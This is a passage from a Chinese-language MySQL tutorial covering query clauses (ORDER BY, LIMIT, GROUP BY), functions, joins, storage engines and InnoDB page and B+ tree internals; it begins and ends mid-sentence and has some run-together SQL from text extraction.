是你想要排序的列的名称，ASC表示升序（默认），DESC表示降序。\n以下是一些例子：\n\n按照单个列进行升序排序：\n SELECT * FROM studentsORDER BY name ASC;\n\n 这将按照name列的字母顺序对students表中的记录进行升序排序。\n\n按照单个列进行降序排序：\n SELECT * FROM studentsORDER BY age DESC;\n\n 这将按照age列的逆序（从高到低）对students表中的记录进行降序排序。\n\n按照多个列进行排序：\n SELECT * FROM studentsORDER BY age ASC, name ASC;\n\n 这将首先按照age列进行升序排序，然后对于具有相同age值的记录，按照name列的字母顺序进行升序排序。\n\n\n请注意，ORDER BY子句应该在SELECT语句的最后使用。如果你想在查询结果中以相反的顺序排序，只需在列名后使用DESC关键字。默认情况下，排序是升序的（ASC）。\nORDER BY可以实现对分组后的结果进行排序，MySQL语句中先写“GROUP BY”再写“ORDER BY”，示例如下：\nSELECT\tempid, AVG(sales)FROM tb\tGROUP BY empidORDER BY AVG(sales)\tDESC;\n\nSELECT empid, AVG(sales)\tFROM tbGROUP BY empid\tHAVING AVG(sales) &gt; 50ORDER BY AVG(sales)\tDESC;\n\nLIMIT在MySQL中，LIMIT用于限制查询结果的数量。它可以在SELECT语句中用于指定返回的行数。\n以下是LIMIT的基本语法：\nSELECT column1, column2, ...FROM table_nameLIMIT number_of_rows;\n\n在这里，column1, column2, … 是你想要从表中选择的列的名称，table_name 是你想要查询的表的名称，number_of_rows 是你希望返回的行数。\n以下是一些使用LIMIT的例子：\n\n限制结果集的行数：\n SELECT * FROM students LIMIT 10;\n\n 这个查询将返回 students 表中的前 10 行记录。\n\n指定起始位置和行数：\n SELECT * FROM students LIMIT 5, 10;\n\n 这个查询将从 students 表中的第 6 行开始（偏移量为 5），返回后续的 10 行记录。这是通过使用两个参数来实现的，第一个参数是起始位置的偏移量，第二个参数是要返回的行数。\n\n\nLIMIT语句还可以与ORDER BY子句一起使用，以在指定排序顺序的基础上限制结果集的行数。例如：\nSELECT * FROM students ORDER BY age DESC LIMIT 5;\n\n这个查询将按照年龄降序排序，并返回年龄最大的前 5 条学生记录。\n请注意，LIMIT子句在查询中的位置很重要，它通常出现在SELECT语句的末尾。\nOFFSET在 MySQL 中，OFFSET 用于从查询结果的某个特定行开始返回数据。OFFSET 必须和 LIMIT 一起使用，以便明确指定要返回的行数和偏移量。\nOFFSET 的语法如下：\nSELECT column1, column2, ...FROM tableWHERE conditionORDER BY column1, column2, ...LIMIT offset, count;\n\n另一种语法是\nSELECT column1, column2, ...FROM tableWHERE conditionORDER BY column1, column2, ...LIMIT count OFFSET offset;\n\n其中，offset 是要偏移的行数，count 是要返回的行数。例如，如果希望跳过前 5 行并获取接下来的 10 行，可以这样写：\nSELECT *FROM mytableORDER BY idLIMIT 5, 10;\n\n或写为：\nSELECT *FROM mytableORDER BY idLIMIT 10 OFFSET 5;\n\n这个查询将返回表中排序后的第 6 行到第 15 行，因为它跳过前 5 行（即偏移量为 5），然后返回接下来的 10 行。\n需要注意的是，在处理大数据集时， OFFSET 可能会影响查询性能，因为它需要跳过指定数量的行，直到达到指定偏移量。为了避免此类问题，可以考虑优化查询或者通过其他手段减少数据集的大小。\nGROUP BY在MySQL中，GROUP BY子句用于将查询结果按照一个或多个列进行分组。它常与聚合函数（如SUM、COUNT、AVG等）一起使用，以对每个组应用聚合函数并生成汇总结果。\n以下是GROUP BY的基本语法：\nSELECT column1, column2, ..., aggregate_function(column)FROM table_nameGROUP BY column1, column2, ...;\n\n在这里，column1, column2, … 是你想要从表中选择的列的名称，table_name 是你想要查询的表的名称，aggregate_function 是一个聚合函数（如 SUM, COUNT, AVG 等），column 是你想要按照其进行分组的列。\n以下是一个例子：\nSELECT department, COUNT(*) as total_studentsFROM studentsGROUP BY department;\n\n这个查询将根据学生表中的department列对记录进行分组，并计算每个部门的学生人数。\n请注意，GROUP BY子句通常与聚合函数一起使用。在SELECT语句中，你可以选择其他非聚合列，但这些列必须出现在GROUP BY子句中或作为聚合函数的参数。否则，将出现错误。\n此外，你还可以在GROUP BY子句中使用多个列，以按照多个列进行分组。例如：\nSELECT department, gender, COUNT(*) as total_studentsFROM studentsGROUP BY department, gender;\n\n这个查询将根据department和gender两个列对记录进行分组，并计算每个部门和性别的学生人数。\nDISTINCTMySQL中的DISTINCT关键字用于去重查询结果集。\n例如，当我们需要查询某张表中的所有员工身份证号码时，可能会出现一些员工重复的情况。此时可以使用DISTINCT关键字来消除重复项，确保查询结果唯一：\nSELECT DISTINCT id_number FROM employee;\n\n上述语句将返回一张包含所有不重复身份证号码的数据表。\n需要注意的是，DISTINCT操作是在内存中进行的，如果查询的结果集比较大，或者查询条件过多，可能会影响查询性能。同时，在使用DISTINCT关键字时，也要注意它适用于单个列的去重，若需要多列的去重，则需要使用GROUP BY语句来实现。\nEXPLAIN在MySQL中，可以使用EXPLAIN关键字来分析SQL语句的执行计划，从而优化查询性能。\nEXPLAIN语法如下：\nEXPLAIN SELECT * FROM table_name WHERE condition;\n\nEXPLAIN会返回一张表格，其中包含了关于MySQL如何处理SQL语句的信息，例如表的读取顺序、使用的索引名及类型、是否需要临时表等等。通过检查这些信息，可以找到潜在的性能问题，并针对性地进行调整。\n常见的一些列含义：\n\nid: 执行SELECT查询的序列号，id相同表示执行相同的查询。\nselect_type: 查询类型，例如Simple表示最简单的查询类型，Derived表示一个派生表或子查询中的查询类型。\ntable: 指出MySQL将从哪个表或派生表读取行。 \npartitions: 匹配的分区列表，如果没有分区则为NULL。\ntype: 显示表的连接类型，包括system, const, eq_ref, ref, range, index和ALL。一般来说，查询类型越复杂，性能越低。\npossible_keys: 展示MySQL可能使用哪些索引来查找表中的行，是一个逗号分隔的索引列表。 \nkey: 表示实际将使用哪个索引，如果为NULL则说明没有找到合适的索引。\nkey_len: 表示MySQL用了索引的长度，如果key为NULL，则key_len也为NULL。\nref: 显示索引的哪一列被使用了，如果可能的话，可能是一个常数。 \nrows: MySQL认为它执行查询时必须检查的行数，这个值是估计出来的，并不一定准确。 \nfiltered: 表示此表过滤器的百分比，即选择性的值。\nExtra: 其他信息，通常提供有关查询策略的特殊说明。\n\n通过对EXPLAIN结果的分析，可以确定哪些操作需要优化，例如加上索引、优化查询条件等，从而提高查询性能。\nIN和EXIST的区别与联系在MySQL中，EXISTS和IN是两个用于条件判断和子查询的关键字。\nEXISTS用于检查子查询是否返回任何行，它返回一个布尔值。如果子查询返回至少一行，EXISTS条件为真（true），否则为假（false）。\nIN用于判断一个值是否存在于子查询的结果集中，它也返回一个布尔值。如果值存在于子查询的结果集中，IN条件为真（true），否则为假（false）。\n以下是使用EXISTS和IN的基本语法示例：\n\n使用EXISTS：\nSELECT column1, column2, ...FROM table_nameWHERE EXISTS (subquery);\n例子：\nSELECT nameFROM studentsWHERE EXISTS (    SELECT *    FROM courses    WHERE courses.student_id = students.id);\n\n使用IN：\nSELECT column1, column2, ...FROM table_nameWHERE column_name IN (subquery);\n例子：\nSELECT nameFROM studentsWHERE id IN (    SELECT student_id    FROM courses);\n\n需要注意的是，EXISTS通常用于检查子查询的存在性，而IN通常用于检查一个值是否存在于另一个查询结果集中。在某些情况下，EXISTS和IN可以互相替代，但根据具体情况选择合适的关键字会更有效。此外，EXISTS通常在子查询的结果集很大时具有更好的性能，而IN适用于较小的结果集。\n函数聚合函数\nSUM：计算某个字段的总和。\nCOUNT：返回某个字段的行数，可以用于计算某个列或整个表中行的数量。\nAVG：计算某个字段的平均值。\nMIN：找出某个字段的最小值。\nMAX：找出某个字段的最大值。\nGROUP_CONCAT：将某个字段的值连接成一个字符串，并以逗号分隔。\n\n以下是MySQL聚合函数的基本用法及语法格式：\n\nSUM\n\nSELECT SUM(column_name) FROM table_name;\n\n\nCOUNT\n\nSELECT COUNT(column_name) FROM table_name;\n\n\nAVG\n\nSELECT AVG(column_name) FROM table_name;\n\n\nMIN\n\nSELECT MIN(column_name) FROM table_name;\n\n\nMAX\n\nSELECT MAX(column_name) FROM table_name;\n\n\nGROUP_CONCAT\n\nSELECT GROUP_CONCAT(column_name SEPARATOR &#x27;,&#x27;) FROM table_name;\n\n其中，column_name为需要进行计算或处理的字段名，table_name为数据表的名称。需要注意的是，在使用GROUP_CONCAT时，可以指定SEPARATOR来指定连接字符串的分隔符，如果没有指定，默认使用逗号作为分隔符。\n字符串操作函数CONCAT()CONCAT函数是用来连接字符串的。\nCONCAT函数接受两个或多个参数，并返回这些参数连接后的字符串结果。常见的用法是将两个或多个字段的值拼接成一个新的字符串：\nSELECT CONCAT(first_name, &#x27; &#x27;, last_name) AS full_name FROM users;\n\n上面的语句会查询users表中的first_name和last_name字段，并将这两个字段的值用空格连接起来，作为新的列full_name的值进行返回。\n需要注意的是，在使用CONCAT函数时，需要注意参数的顺序以及字符串之间的分隔符。例如，如果要在两个字符串之间添加空格，可以使用空格字符’ ‘作为参数之一。\nRIGHT()RIGHT函数返回一个字符串的右侧指定长度的子字符串。使用时需要指定两个参数：要截取的字符串和需要返回的字符长度。\n例如，下面的语句会查询users表中的username字段，并返回该字段后两个字符组成的新的字符串：\nSELECT RIGHT(username, 2) AS last_two_chars FROM users;\n\nSUBSTRING()SUBSTRING函数可以从一个字符串中截取指定位置和长度的子字符串。使用时需要指定三个参数：要截取的字符串、开始的位置（从1开始计数）和需要返回的字符长度。\n例如，下面的语句会查询users表中的phone_number字段，并返回该字段第4个字符开始的3个字符组成的新的字符串：\nSELECT SUBSTRING(phone_number, 4, 3) AS area_code FROM users;\n\nREPEAT()REPEAT函数返回一个重复指定次数的字符串。使用时需要指定两个参数：需要重复的字符串以及需要重复的次数。\n例如，下面的语句会返回一个由5个“-”字符组成的新的字符串：\nSELECT REPEAT(&#x27;-&#x27;, 5) AS line FROM users;\n\nREVERSE()REVERSE函数返回一个字符串的反转形式，即将字符串中的字符顺序颠倒。使用时只需要指定一个参数，即要翻转的字符串。\n例如，下面的语句会查询users表中的username字段，并将该字段的字符顺序全部颠倒：\nSELECT REVERSE(username) AS reversed_name FROM users;\n\n日期和时间函数MySQL提供了很多日期和时间函数，可以方便地对日期和时间进行处理和计算。以下是一些常用的MySQL日期和时间函数：\nNOW()NOW()函数返回当前日期和时间。\n例如，下面的语句会查询当前日期和时间：\nSELECT NOW();\n\nDATE()DATE函数从一个日期或日期时间表达式中提取日期部分。\n例如，下面的语句会返回当前日期：\nSELECT DATE(NOW());\n\nTIME()TIME函数从一个日期或日期时间表达式中提取时间部分。\n例如，下面的语句会返回当前时间：\nSELECT TIME(NOW());\n\nYEAR()YEAR函数从一个日期或日期时间表达式中提取年份部分。\n例如，下面的语句会返回当前年份：\nSELECT YEAR(NOW());\n\nMONTH()MONTH函数从一个日期或日期时间表达式中提取月份部分。\n例如，下面的语句会返回当前月份：\nSELECT MONTH(NOW());\n\nDAY()DAY函数从一个日期或日期时间表达式中提取日份部分。\n例如，下面的语句会返回当前日期中的天数：\nSELECT DAY(NOW());\n\nHOUR()HOUR函数从一个日期或日期时间表达式中提取小时部分。\n例如，下面的语句会返回当前时间中的小时数：\nSELECT HOUR(NOW());\n\nMINUTE()MINUTE函数从一个日期或日期时间表达式中提取分钟部分。\n例如，下面的语句会返回当前时间中的分钟数：\nSELECT MINUTE(NOW());\n\nSECOND()SECOND函数从一个日期或日期时间表达式中提取秒部分。\n例如，下面的语句会返回当前时间中的秒数：\nSELECT SECOND(NOW());\n\nDATE_SUB()在 MySQL 中，可以使用 DATE_SUB() 函数和 INTERVAL 子句来查询一个日期字段 c 为五年前的记录。具体语法如下：\nSELECT * FROM tableWHERE c = DATE_SUB(NOW(), INTERVAL 5 YEAR);\n\n这个查询语句中，NOW() 函数返回当前时间，DATE_SUB() 函数将当前时间减去 5 年，然后查询满足条件的所有记录。\nCURDATE()CURDATE() 函数返回系统当前日期。例如，以下查询语句将会返回当前日期：\nSELECT CURDATE();\n\nDATEDIFF()DATEDIFF(date1, date2) 函数返回两个日期之间的天数差值（即 date1 - date2）。例如，以下查询语句将会计算出今天与指定日期之间的天数差值：\nSELECT DATEDIFF(CURDATE(), &#x27;2022-01-01&#x27;);\n\nDATE_ADD()DATE_ADD(date, INTERVAL value unit) 函数可以对给定日期增加或减去一定的时长。其中 date 为基准日期，value 为增加或减少的数值，unit 为时间单位（如 DAY、WEEK、MONTH、YEAR 等）。例如，以下查询语句将会计算出五年前的日期：\nSELECT DATE_ADD(CURDATE(), INTERVAL -5 YEAR);\n\nDATE_FORMAT()DATE_FORMAT(date, format)函数可以将给定日期格式化成指定的字符串形式。其中date 为待格式化的日期，format&#96; 为日期格式串（如 ‘%Y-%m-%d’ 表示以年、月、日的格式显示日期）。例如，以下查询语句将会格式化出当前日期并输出：\nSELECT DATE_FORMAT(CURDATE(), &#x27;%Y-%m-%d&#x27;);\n\n表查询条件查询用于创建条件的关键字：\n\nWHERE\n\nHAVING\n\n运算符（如=，!=，&lt;，&gt;，&lt;=，&gt;=，&lt;&gt;，&lt;=&gt;）\n\n运算关键字（如AND，OR，NOT，XOR，IN，EXISTS，BETWEEN，LIKE，IS NULL，ANY，ALL）\n在 MySQL 中，AND、OR 和 NOT 是逻辑运算符，用于连接和组合多个条件表达式。当它们同时出现在一个查询语句中时，需要考虑它们的优先级。\nMySQL 中的运算符优先级遵循以下顺序（由高到低）：\n\nNOT\nAND\nOR\n\n这意味着，NOT 的优先级最高，所以它会优先计算其后面的条件表达式，然后再应用其他的运算符。而 AND 的优先级比 OR 高，因此，在一个查询语句中，如果同时出现了 AND 和 OR 运算符，AND 会先于 OR 进行计算。\n为了避免运算符优先级带来的不必要的困惑，我们可以使用圆括号来明确指定某些条件的计算顺序。具体来说，使用括号可以将几个条件组合在一起，并确保它们在适当的顺序下进行计算。\n下面是一个例子，演示了如何在查询语句中使用括号控制条件表达式的计算顺序：\nSELECT * FROM mytableWHERE (col1 = &#x27;value1&#x27; OR col2 = &#x27;value2&#x27;)AND col3 &gt; 100;\n\n在这个例子中，首先使用括号指定 OR 条件的计算顺序，然后再结合 AND 运算符对这些条件进行组合。它的作用相当于检索 col1 等于 ‘value1’，或者 col2 等于 ‘value2’，并且 col3 大于 100 的所有行。\n\n\n联合查询（UNION）在 MySQL 中，UNION 关键字用于将两个或多个 SELECT 语句的结果集合并成一个结果集。UNION 可以去除重复行，而 UNION ALL 则包含所有的行（包括重复行）。以下是 UNION 和 UNION ALL 的语法格式：\n-- UNION 示例SELECT column1, column2, ... FROM table1UNIONSELECT column1, column2, ... FROM table2;UNIONSELECT column1, column2, ... FROM table3;...-- UNION ALL 示例SELECT column1, column2, ... FROM table1UNION ALLSELECT column1, column2, ... FROM table2;UNION ALLSELECT column1, column2, ... FROM table3;...\n\n在这个示例中，我们可以通过 UNION 合并两个表的查询结果，并返回所有不重复的行；或者通过 UNION ALL 合并两个表的查询结果，并返回所有行，包括重复行。\n需要注意的是，在使用 UNION 或 UNION ALL 进行结果集合并时，两个 SELECT 语句必须满足以下条件：\n\nSELECT 语句中列数必须相同。\n列类型必须相似或可隐式转换。\n结果集中的列名来自第一个 SELECT 语句，后续的 SELECT 语句只能：\n与第一个 SELECT 语句中的列具有相同的名称，或者\n为其列命名以匹配结果集的结构。\n\n\n\n例如，以下是一个 UNION 操作的示例：\nSELECT name, age FROM table1UNIONSELECT name, age FROM table2;UNIONSELECT name, age FROM table3;\n\n这里我们将查询结果按照 name 和 age 两列进行合并，如果存在相同的行则只返回一次。需要注意的是，UNION 操作会对结果集进行排序和去重操作，因此可能需要-根据实际情况调整查询语句的顺序和筛选条件。\n总而言之，在 MySQL 中使用 UNION 和 UNION ALL 可以使我们方便地将多个查询结果组合在一起，并可以选择是否保留重复行。\n子查询通俗的讲，在SELECT的记录中SELCT就是子查询。子查询是在查询中使用一个查询作为另一个查询的子集。使用子查询可以轻松地扩展查询功能并实现更复杂的条件过滤机制。\n下面是一个示例，该示例演示如何使用子查询：\n假设您有两个表：Orders和Customers，分别存储订单和客户的信息。现在，假设您想要查询所有来自某些城市的顾客的订单详细信息。您可以使用以下查询：\nSELECT *FROM OrdersWHERE customer_id IN (  SELECT customer_id  FROM Customers  WHERE city = &#x27;New York&#x27;);\n\n这个查询中，内部SELECT语句是一个子查询，它返回所有位于“New York”城市的客户ID。外部SELECT语句使用WHERE子句来过滤Orders表中包含在子查询结果集中的customer_id值的行，并将行返回到结果集中。\n下面是另一个示例：\n提取大于等于平均值的记录\nSELECT *FROM tb1WHERE age &gt;= (\tSELECT AVG(age) FROM tb1)\n\n下面是使用IN的子查询的语法：\nSELECT column_name1, column_name2... FROM table_nameWHERE column_name IN (通过子查询SELECT语句提取的列)\n\n示例：\nSELECT empid, name\tFROM tb1WHERE empid \tIN (SELECT empid FROM tb2);\n\n下面是使用EXISTS的子查询的语法：\nSELECT column_name1, column_name2... FROM table_nameWHERE EXISTS (通过子查询SELECT语句提取的列);\n\n示例：\nSELECT *\tFROM tb1WHERE EXISTS\t(SELECT * FROM tb2 WHERE tb1.empid=tb2.empid);\n\n连接查询自连接自连接是将表与其自身同名的表进行连接\n在MySQL中，使用自连接时需要使用别名（alias）来区分每个表实例。以下是一个示例：\nSELECT a.employee_name, b.employee_nameFROM employee a, employee bWHERE a.manager_id = b.employee_id;\n\n在上面的例子中，我们查询了“employee”表中所有员工的名称和他们各自的经理的名称。为此，我们需要对“employee”表进行自连接，以将每个员工与其经理联系起来。这里我们使用a和b两个别名来表示同一个表中的两个不同实例。在上面的例子中，我们在WHERE子句中指定连接条件“manager_id &#x3D; b.employee_id”，这意味着我们正在连接的是一个员工和他的经理。\n或者也可以使用内连接关键字进行自连接：\nSELECT a.emp_id, b.emp_name AS manager_nameFROM employee aJOIN employee bON a.manager_id = b.emp_id;\n\n内连接（INNER JOIN）INNER JOIN操作用于连接两个表并返回匹配的行，只有当在关联列中两个表都存在匹配时才会返回结果。除此之外，还有一种相似的语法格式叫做“JOIN…ON…”，其效果与INNER JOIN完全相同。\n语法格式：\nSELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name = table2.column_name;\n\n使用示例：查询商品表和订单表中有关联的数据\nSELECT orders.id, orders.order_date, products.product_nameFROM ordersINNER JOIN productsON orders.product_id = products.id;\n\n在上面的例子中，我们连接了“商品”表和“订单”表，并使用ON子句指定了连接条件（“product_id”），结果集包括了这两个表中符合连接条件的数据。\n左外连接（LEFT JOIN）LEFT JOIN操作连接左侧的表和右侧的表，并返回左侧表的所有记录以及满足连接条件的右侧表的记录，如果没有匹配的行，则该结果集中的右侧表的字段将被设置为NULL值。\nLEFT JOIN也可以写成LEFT OUTER JOIN\n语法格式：\nSELECT column_name(s) FROM table1 LEFT [OUTER] JOIN table2 ON table1.column_name = table2.column_name;\n\n使用示例：查询所有的部门和员工数据以及那些没有员工的部门\nSELECT departments.department_name, employees.first_name, employees.last_nameFROM departmentsLEFT JOIN employeesON departments.department_id = employees.department_id;\n\n在上面的例子中，我们连接了“部门”和“员工”两个表，并使用ON子句指定了共同字段（“department_id”），因此返回的结果集包括了所有的部门和符合连接条件的员工信息，即使某些部门没有员工也会显示出来。\n右外连接（RIGHT JOIN）RIGHT JOIN操作连接右侧的表和左侧的表，并返回右侧表的所有记录以及满足连接条件的左侧表的记录。如果没有匹配的行，则该结果集中的左侧字段将被设置为NULL值。\nRIGHT JOIN也可以写成RIGHT OUTER JOIN\n语法格式：\nSELECT column_name(s) FROM table1 RIGHT [OUTER] JOIN table2 ON table1.column_name = table2.column_name;\n\n使用示例：查询所有的员工数据以及那些没有被分配到部门的员工\nSELECT employees.first_name, employees.last_name, departments.department_nameFROM employeesRIGHT JOIN departmentsON employees.department_id = departments.department_id;\n\n在上面的例子中，我们连接了“员工”和“部门”两个表，并使用ON子句指定了共同字段（“department_id”），因此返回的结果集包括了所有的员工信息和与之相关的部门信息，即使某些员工没有分配到部门也会显示出来。\nLEFT JOIN和RIGHT JOIN可以用于处理一对多、多对一的关系查询\nON和USINGMySQL ON是一种在两个表之间进行连接的常用方法，通过指定连接条件来连接两个表并返回符合条件的结果。与WHERE最大的区别是不符合WHERE子句的的记录不论是来自驱动表还是被驱动表都不会加入结果集；而ON和USING作用的驱动表的记录即使在被驱动表中找不到匹配的记录，也依然会被加入到结果集中。对于内连接来说，表即时驱动表也是被驱动表，当记录不符合ON子句中的连接条件时，内连接不会将记录加入结果集。\n语法格式：\nSELECT column_name(s) FROM table1 JOIN table2 ON table1.column_name = table2.column_name;\n\n其中，table1和table2是要连接的表，column_name是连接两个表的共同列名。\n使用示例：查询所有部门和员工数据\nSELECT departments.department_name, employees.first_name, employees.last_nameFROM departmentsJOIN employees ON departments.department_id = employees.department_id;\n\n需要注意的是，在使用ON子句时，可以比较不同类型的数据，如数字、文本等。在连接多个表时，也可以在ON子句中使用逻辑运算符（例如AND和OR），以指定更复杂的连接条件。\nMySQL USING是一种简化JOIN操作的方法，该操作将在两个表之间使用共同的列进行连接。这样可以避免在ON子句的连接条件中重复指定相同列名，从而使查询更加简洁。\n语法格式：\nSELECT column_name(s) FROM table1 JOIN table2 USING (column_name);\n\n其中，table1和table2是要连接的表，column_name是连接两个表的共同列名。\n使用示例：查询所有部门和员工数据\nSELECT departments.department_name, employees.first_name, employees.last_nameFROM departmentsJOIN employees USING (department_id);\n\n需要注意的是，USING只能用于比较两个表中具有相同名称的列，如上面的例子中的department_id。如果两个表的连接条件的列名称不同，则必须使用ON子句来指定要连接的列\n存储引擎MySQL的存储引擎输出MySQL支持的存储引擎：\n\n其中，Support列表示该存储引擎是否可用；Transactions列表示该存储是否支持事务，XA（eXtended Architecture）列代表该存储引擎是否支持分布式事务，SavePoints列代表该存储引擎是否支持事务的部分回滚。\n\nInnoDB：支持事务、分布式事务、行级锁、外键，其它存储引擎都不支持。\nMYISAM：支持表级锁。\nMEMORY：使用内存存储数据而不是磁盘。\n\n设置存储引擎存储引擎负责对表中的数据进行读取和写入、以及将数据存储到物理存储器上等功能。可以为不同的表设置不同的存储引擎，即不同的表可以有不同的物理存储结构、不同的读取和写入的方式。\n设置表的存储引擎的方法：\n\n创建表时指定存储引擎\n语法示例：\nCREATE TABLE 表名 &#123;\t建表语句;&#125; ENGINE = 存储引擎的名称;\n\n修改表的存储引擎\n\n\n显示存储引擎可以通过显示表的创建信息命令来查看使用的存储引擎\nSHOW CREATE TABLE employee; \n\n输出结果示例如下：\nCREATE TABLE `employee` (  `id` int NOT NULL,  `emp_id` char(10) DEFAULT NULL,  `emp_name` varchar(10) DEFAULT NULL,  `manager_id` char(10) DEFAULT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci\n\n修改存储引擎如果需要修改已有表的存储引擎，可以使用ALTER TABLE语句来实现.\n语法：\nALTER TABLE 表名 ENGINE = 存储引擎的名称;\n\n示例：\nALTER TABLE table_name ENGINE=MyISAM;\n\n使用上述语句将会将名为table_name的表的存储引擎修改为MyISAM。\nInnoDB原理查询过程MySQL数据查询的主要过程：\n\n查询缓存\nMySQL会缓存查询结果，如果在缓存期间发生了数据更改，则缓存失效，会被删除。如果数据没有更改，则对于完全一致且不存在某些会改变查询含义的函数如NOW()，就会直接返回缓存中的内容。\n但是维护缓存是需要开销的，包括查询缓存、添加缓存、删除缓存、维护缓存内存区域。所以MySQL从5.7.20开始不推荐使用MySQL查询缓存功能，在MySQL8.0中直接将其删除了。\n\n语法解析\n判断语法是否正确。\n属于编译过程，涉及词法分析、语法分析、语义分析等。\n\n查询优化\n对语句进行优化，最终生成一个执行计划，可以使用EXPLAIN语句来查看某个语句的执行计划。\n\n存储引擎执行查询语句\n\n\n表空间页结构InnoDB将树划分为若干页，以页而不是记录作为磁盘和内存之间交互的基本单位，InnoDB中页的大小一般是16KB，由启动选项（也是系统变量）innodb_page_size指定。\nInnoDB对于每张表维护了一个按照主键值由大到小的顺序链接起来的记录的单向链表。记录中的next_record指向了下一个记录的真实数据的位置（记录头和真实数据之间的位置）。之所以指向这个位置，是因为在这个位置向坐读取就是记录头，向右就是真实数据，且变长字段长度列表、NULL值列表中的信息都是逆序存放的，在这个位置能够方便的读取记录头信息和真实数据信息。\n对于执行了删除操作的记录，并不是真正被删除，而是将deleted_flag设置为了1，所有被删除的记录回组成一个垃圾记录的链表，记录在这个链表中的空间称为可重用空间。之所以不真正删除，是因为移除字段需要重新排列其它记录，回消耗性能，之后如果有新记录插入到表中，它们就会覆盖掉被删除的记录占用的存储空间。\n页目录\n页目录（Page Directory）是将所有记录（不包括以及删除的记录）划分为几个组，页目录中记录了每个组最后一条记录的地址偏移量，页目录中的这些地址偏移量称为槽（Slot），每个槽占用两个字节（0~65536字节），足以覆盖页面的地址偏移量范围（16KB&#x3D;16384字节）。\n分组的记录条数规则是，Infimum记录的分组只有一条记录，Supremun记录所在的分组拥有的记录条数只能在18条之间，剩下的分组的记录的条数范围只能在48条之间。对于后两种情况，当超过了8条的上限（9条），就会将组中的记录拆分成两个组，其中一个组中有4条记录，另一个组中有5条记录。\n 查找指定主键值的记录的过程是，首先使用二分法在页目录中定位记录所在的槽，然后从该槽所在的分组中主键值最小的记录开始遍历组中的记录，就可以找到指定主键值的记录。\n页面头部\n页面头部（Page Header）存储了数据页的状态信息，如页目录中槽的数量、还未使用的空间的最小地址（Free Space）、已删除记录占用的字节数、当前页在B+树中所处的层级、索引ID等。\n文件头部\n文件头部（File Header）是各种类型页（如undo日志页、溢出页、数据页等）的通用信息，如页的编号、页的上一页、页的下一页等。\n文件尾部\n因为存在数据刷新一般还没有结束的时候断电的可能，所以为了便于检测一个页是否完整，InnoDB在每个页的尾部添加了一个File Trailer部分。\nFile Trailer的前四个字节代表页的校验和，File Header中也有页的校验和，没有发生异常的情况下，两个校验和应该相等。如果发生了数据还没刷新完（假设File Header已经先被刷新到磁盘）就断电，则如果校验File Trailer和File Header或发现两者的校验和不一致，则说明刷新期间出错。\n行格式数据库表中的每条数据可以被称为行或记录，InnoDB支持4种不同类型的行格式，分别是COMPACT、REDUNDANT、DYNAMIC、COMPRESSED。\n指定行格式的语法：\n(CREATE TABLE 表名 (列的信息))|(ALTER TABLE 表名 ROW_FORMAT) ROW_FORMAT=行格式;\n\nCOMPACT行格式：\n一条完整的记录包含：变长字段长度列表、NULL值列表、记录头信息、记录的数据\n变长字段长度列表的每个字段长度的字节数根据变长字段的长度不同，可能是1字节也可能是2个字节，长度规则是：\n\n如果M * W &lt;&#x3D; 255，则使用1个字节表示真实的数据占用字节数。\n如果M * W &gt; 255，则又分两种情况：\n如果L &lt;&#x3D; 127，则使用1字节表示真实数据占用的字节数。\n如果L &gt; 127，则使用2字节表示真实数据占用的字节数。\n\n\n\nM：字符的最大长度；W：字符集中字符的最大字节数；L：实际的字符串占用的字节长度。\n当变长字段长度的首位为0时表示当前长度是2字节，当首位为1表示当前是1字节。\nNULL值列表中的二进制位是逆序排列的，高位补0。\n变长字段长度列表、NULL值列表中的信息都是逆序存放\n记录的数据中处理自定义的列数据外，MySQL还会为每个记录添加一些列（也称隐藏列），如ROW_ID, TRX_ID, ROLL_POINTER。InnoDB的主键生成策略是，优先使用用户自定义的主键，如果没有定义，则选用一个不存储NULL值的UNIQUE键作为主键，如果都没有，则为表添加一个名为如ROW_ID的隐藏列作为主键。 \nREDUNDANT的MySQL5.0版本之前的一种行格式。\nDYNAMIC是MySQL5.7版本引入的，是MySQL5.7默认行格式。\nCOMPRESSED行格式会采用压缩算法对页面进行压缩。\n除REDUNDANT是非紧凑的外，其它三种行格式都是紧凑的。\nB+树索引InnoDB中的索引方案\n复用了存储数据的数据页来存储目录项（区别于页目录，目录项是给页建立的目录，页目录是给记录建立的目录），支持多级目录，数据页的数据结构是B+树，存放用户记录的数据页是B+树的叶子节点（规定该层为第0层），存放目录项的数据页是B+树的非叶子节点或内节点。\nN层B+树能够存储的记录数：(M)^N * T，其中M是每个页可以存储的目录项的数量，T是每个页可以存储的记录的数量。\nInnoDB根据主键值查找记录的流程：\n\n首先使用二分法，在目录项的数据页中，按照层级由高到低，查找记录所在的页；\n然后继续使用二分法，在存储记录的数据页中，查找记录所在组的地址偏移量，然后从所在的分组中主键值最小的记录开始遍历组中的记录，就可以找到指定主键值的记录。\n\nB+树索引的类型\nB+树索引可以分为聚簇索引（也称聚集索引，clustered index）、辅助索引（有时也称非聚簇索引或二级索引，secondary index，non-clustered index），和联合索引（也称复合索引、多列索引）。\n\n聚簇索引\n\n使用记录的主键值大小进行记录和页的排序\n叶子节点存储的是完整的用户记录\n\n具有以上两个特点的B+树称为聚簇索引。\n\n二级索引\n聚簇索引只能在搜索条件是主键时生效，原因是聚簇索引中的数据都是按照主键进行排序的。如果要以其它列为搜索条件，就需要额外建立二级索引。\n\n使用其它非主键（此处称之为，被排序列）的大小进行记录和页的排序\n叶子节点存储的不是完整的用户记录，只是被排序列+主键两个列的值\n目录项中的记录不再是主键+页号，而是被排序列+主键（保证目录项记录是唯一的）+页号\n\n具有以上三个特点的B+树称为二级索引。\n如果需要其它（除索引和主键外的）列信息，需要执行回表操作。\n\n联合索引\n也可以同时以多个列的大小作为排序规则，也就是同时为多个列建立索引。\n\n使用多个列（此处称之为，被排序的列，存在先后顺序）的大小进行记录和页的排序\n同二级索引\n同二级索引\n\n具有以上三个特点的B+树称为联合索引。\n\n\nB树和B+树之间的主要区别\n\n结构：B树和B+树的结构略有不同。B树中的每个节点包含键值和对应的数据，而B+树中的内部节点只包含键值，而数据存储在叶子节点中。叶子节点之间通过链表连接，形成了一个有序的数据链表。\n范围查询：由于B+树的叶子节点之间通过链表连接，可以方便地进行范围查询。而在B树中，由于数据分散在各个节点中，范围查询需要在树的不同层级进行搜索和合并，相对较慢。\n插入和删除操作：在B+树中，由于数据只存在于叶子节点中，插入和删除操作只需要修改叶子节点，而在B树中，插入和删除可能需要修改多个节点。因此，B+树相对于B树来说，插入和删除